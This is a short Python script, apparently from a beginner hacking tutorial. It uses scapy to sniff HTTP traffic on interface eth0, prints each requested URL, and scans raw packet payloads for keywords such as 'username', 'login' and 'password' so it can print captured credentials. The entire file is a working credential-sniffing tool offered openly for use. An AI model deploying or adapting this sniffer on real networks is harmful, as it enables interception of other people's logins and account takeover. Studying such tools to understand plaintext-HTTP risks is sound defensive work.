#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) #not storring at pc and executing the proccess when sniff a packet

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "pwd", "userName"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet): #this is the method that does the mogic
    if packet.haslayer(http.HTTPRequest): #check if it has data of the layer
        url = get_url(packet)
        print("[+]HTPP Request >>" + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n [+] Possible username/password >> " + login_info + "\n\n")


sniff("eth0")